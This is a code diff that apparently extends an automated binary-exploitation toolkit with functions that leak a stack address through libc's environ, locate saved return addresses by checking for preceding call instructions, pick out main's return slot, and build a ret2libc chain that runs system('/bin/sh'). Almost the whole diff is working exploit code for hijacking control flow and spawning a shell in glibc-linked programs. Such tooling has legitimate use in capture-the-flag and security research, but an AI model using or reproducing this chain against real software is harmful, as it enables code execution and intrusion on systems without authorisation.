@@ -1551,3 +1551,184 @@ def build_setcontext_frame(fields: dict, rip_at, *, rip: int, rsp: int, rdi: int
     for name, val in (("rdi", rdi), ("rsi", rsi), ("rdx", rdx), ("rcx", rcx)):
         _w(fields.get(name), val)
     return bytes(buf)
+
+
+# --- the stack, reached from libc's `environ` ----------------------------------------------------
+# An arbitrary READ that discloses a libc base can also disclose a STACK address, because libc
+# exports `environ` -- a `char **` whose VALUE is the envp array, which the kernel put on the
+# initial stack. That turns "I can read and write anywhere" into "I can overwrite a saved return
+# address", which is the one target that needs no FILE, no allocator state and no exit handler.
+#
+# The hard part is not getting a stack address, it is knowing WHICH word below it is a saved return
+# address rather than a code pointer that happens to live in a local. The test used here is the one
+# fact that distinguishes them and does not depend on the compiler: a saved return address is the
+# address of the instruction AFTER a `call`, so the bytes immediately before it in the target's own
+# image must decode as a call. Nothing about register allocation, frame layout or optimisation level
+# changes that.
+_CALL_SITE_MAX = 7                                       # longest indirect `call` we recognise
+
+
+def _off_of(segs, vaddr: int, need_x: bool = False):
+    """File offset of a vaddr, the inverse of `_va_of`."""
+    for off, sz, va, flags in segs:
+        if va <= vaddr < va + sz and (not need_x or (flags & 1)):
+            return off + (vaddr - va)
+    return None
+
+
+def exec_range(data: bytes):
+    """(lo, hi) spanning every executable PT_LOAD vaddr, or None. For a no-PIE binary this IS the
+    runtime range of its code; for PIE the caller must add the disclosed load base."""
+    segs = [s for s in _loads(data) if s[3] & 1]
+    if not segs:
+        return None
+    return (min(va for _o, _s, va, _f in segs),
+            max(va + sz for _o, sz, va, _f in segs))
+
+
+def is_return_site(data: bytes, vaddr: int, *, load_base: int = 0) -> bool:
+    """Whether `vaddr` is the address right after a `call` in this image -- i.e. whether a word
+    equal to it on the stack is a SAVED RETURN ADDRESS rather than some other code pointer.
+
+    Checks the two encodings that actually occur: `e8 rel32` (5 bytes, a direct call) and the
+    `ff /2` family (`call rax`, `call [rip+disp]`, `call [rbx+8]` ... 2 to 7 bytes), the latter by
+    looking for an `ff` whose ModRM reg field is 2. A function pointer stored in a local, a vtable
+    entry read onto the stack and the GOT's own copies all fail this, which is the point."""
+    segs = _loads(data)
+    off = _off_of(segs, vaddr - load_base, need_x=True)
+    if off is None or off < _CALL_SITE_MAX:
+        return False
+    if data[off - 5:off - 4] == b"\xe8":
+        return True
+    for back in range(2, _CALL_SITE_MAX + 1):            # ff /2: call r/m64
+        if data[off - back] == 0xFF and ((data[off - back + 1] >> 3) & 7) == 2:
+            return True
+    return False
+
+
+def libc_symbol_ranges(data: bytes, names) -> dict:
+    """{name: (st_value, st_size)} for exported symbols -- `libc_symbols` with the size kept, which
+    is what lets a leaked code pointer be tested for lying INSIDE a named function."""
+    secs = _sections(data)
+    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
+    if not ds or not st:
+        return {}
+    is64, endc = _elf_class_endian(data)
+    entsize = ds[2] or (24 if is64 else 16)
+    want, out = set(names), {}
+    for o in range(ds[0], ds[0] + ds[1], entsize):
+        try:
+            if is64:
+                st_name, _i, _o2, st_shndx, st_value, st_size = struct.unpack_from(
+                    endc + "IBBHQQ", data, o)
+            else:
+                st_name, st_value, st_size, _i, _o2, st_shndx = struct.unpack_from(
+                    endc + "IIIBBH", data, o)
+        except struct.error:
+            break
+        if st_shndx == 0 or not st_value:
+            continue
+        end = data.find(b"\x00", st[0] + st_name)
+        nm = data[st[0] + st_name:end].decode("latin-1", "replace")
+        if nm in want and nm not in out:
+            out[nm] = (st_value, st_size)
+    return out
+
+
+def saved_return_slots(read_words, stack_hint: int, *, images, span: int = 0x400,
+                       limit: int = 6, skip=()) -> list:
+    """Walk DOWN from a disclosed stack address collecting SAVED RETURN ADDRESSES, outermost
+    (highest address) first, as [(slot_addr, value, image_label)].
+
+    `read_words(addr) -> iterable[int]` is the caller's arbitrary read, returning EVERY value the
+    target could have printed for that word rather than one guess -- a decimal, a hex literal and
+    each raw byte window all come back, and the return-site test is what picks between them, the
+    same way every other predicate in this module is applied to a candidate list. `stack_hint` is
+    typically the
+    value of libc's `environ`, which the kernel placed near the stack's high end, so every live
+    frame is below it. `images` is [(label, image_bytes, load_base, lo, hi)] -- the target and its
+    libc both have to be offered, because which image a saved return points INTO depends entirely
+    on where the program reads its input: a target whose menu loop lives in main has no
+    target-code return address that is still live, and its only useful slot is main's own, which
+    points into libc. `skip` is [(lo, hi)] of values to reject.
+
+    Why the walk stops at `span` (0x400) rather than going deeper: the frames of whatever is
+    reading our input sit BELOW main's, and anything written there is scribbled over by the next
+    `printf`/`scanf` before the frame it belongs to ever returns -- measured, as a write that did
+    not read back and a process that died at the trigger. The slots worth having are the outermost
+    few, and they are within a few hundred bytes of `environ`."""
+    out = []
+    top = stack_hint & ~7
+    for addr in range(top, max(top - span, 8), -8):
+        hit = None
+        for v in read_words(addr) or ():
+            if any(lo <= v < hi for lo, hi in skip):
+                continue
+            for label, data, load_base, lo, hi in images:
+                if lo <= v < hi and is_return_site(data, v, load_base=load_base):
+                    hit = (addr, v, label)
+                    break
+            if hit:
+                break
+        if hit:
+            out.append(hit)
+            if len(out) >= limit:
+                break
+    return out
+
+
+def main_return_images(target_bytes: bytes, libc_data: bytes, libc_base: int, *,
+                       target_base: int = 0):
+    """The (images, skip) pair for `saved_return_slots` when the goal is MAIN's saved return.
+
+    `skip` excludes `__libc_start_main`'s own body, and that single exclusion is what makes the
+    answer unambiguous. Below `environ` there are exactly two libc return addresses above main's
+    frame: the one `_start` pushed (which points into the TARGET and belongs to a frame
+    `__libc_start_main` never returns from) and the one `__libc_start_main` pushed when it called
+    `__libc_start_call_main` (which points INSIDE `__libc_start_main`, and is equally dead,
+    because `__libc_start_call_main` is noreturn). Main's own saved return points into
+    `__libc_start_call_main`, which no libc exports -- but it is the first libc return site that is
+    NOT inside `__libc_start_main`, and `__libc_start_main` is exported with its size."""
+    lsm = libc_symbol_ranges(libc_data, ("__libc_start_main",)).get("__libc_start_main")
+    tr = exec_range(target_bytes) or (0, 0)
+    lr = exec_range(libc_data) or (0, 0)
+    images = [("libc", libc_data, libc_base, libc_base + lr[0], libc_base + lr[1]),
+              ("target", target_bytes, target_base,
+               target_base + tr[0], target_base + tr[1])]
+    skip = [(libc_base + lsm[0], libc_base + lsm[0] + (lsm[1] or 1))] if lsm else []
+    return images, skip
+
+
+def build_stack_ret2libc(*, pop_rdi: int, binsh: int, system: int, ret_gadget: int = 0) -> list:
+    """The words to write over a saved return address so the frame's `ret` runs
+    `system("/bin/sh")`: [pop rdi; ret][&"/bin/sh"][system]. Returned as a list so the caller can
+    write them one at a time with whatever one-word write it has.
+
+    Three words land at slot, slot+8 and slot+16 -- the second and third are inside the CALLER's
+    frame, which is safe precisely because control never returns there once the first word is
+    consumed. `ret_gadget` inserts an extra `ret` to fix rsp's 16-byte alignment when the movaps in
+    system's prologue needs it."""
+    chain = [pop_rdi, binsh]
+    if ret_gadget:
+        chain.insert(0, ret_gadget)
+    chain.append(system)
+    return chain
+
+
+def environ_stack_targets(libc_data: bytes) -> dict:
+    """What the `environ` route needs out of the libc the target links: the `environ` variable to
+    read a stack address from, and the three pieces of a `system("/bin/sh")` chain to write over a
+    saved return address. Empty if any is missing.
+
+    `environ` is tried under all three exported spellings -- the weak `environ`, the global
+    `__environ` and the historical `_environ` -- because which one a build exports is not fixed."""
+    syms = libc_symbols(libc_data, ("environ", "__environ", "_environ", "system"))
+    env = next((syms[n] for n in ("environ", "__environ", "_environ") if n in syms), None)
+    pop_rdi = find_gadget(libc_data, "pop_rdi")
+    binsh = find_string(libc_data, b"/bin/sh")
+    if not (env and pop_rdi and binsh and "system" in syms):
+        return {}
+    return {"environ": env, "environ_name": next(n for n in ("environ", "__environ", "_environ")
+                                                 if n in syms),
+            "pop_rdi": pop_rdi, "binsh": binsh, "system": syms["system"],
+            "ret": find_gadget(libc_data, "ret") or 0}
